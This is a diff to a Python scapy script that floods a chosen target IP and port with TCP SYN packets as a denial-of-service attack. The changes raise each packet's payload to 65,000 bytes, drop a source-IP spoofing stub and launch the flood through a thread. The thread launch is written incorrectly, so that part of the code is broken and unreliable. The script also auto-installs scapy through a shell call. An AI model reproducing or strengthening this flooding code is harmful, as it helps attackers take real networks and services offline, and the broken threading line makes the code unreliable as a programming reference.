@@ -9,8 +9,7 @@ from platform import platform
 from os import listdir
 os.system('pip3 install scapy')
 from scapy.all import *
-
-
+import _thread
 
 
 
@@ -135,30 +134,28 @@ def DoS_synflood():
     tcp = TCP(sport=RandShort(), dport=int(target_port), flags="S")
     
     # add some flooding data (1kb in this case)
-    raw = Raw(b"X"*1024)
+    raw = Raw(b"X"*65000)
 
     # stack up the layers
     p = ip / tcp / raw 
 
     # send the constructed packet in a loop until CTRL+C is detected 
-    send(p, loop=1, verbose=0)
+    send(p, loop=1)  
+    
 
 
 
 
 
 
-def DoS_spoof():    
-    ip = IP(src=RandIP("192.168.1.1/24"), dst=target_ip)
 
 
 
 
 
+os.system('pause')  
 
-os.system('pause')
-
-DoS_synflood()
+_thread.start_new_thread(DoS_synflood())
 
 
 input("Press Enter to exit:")
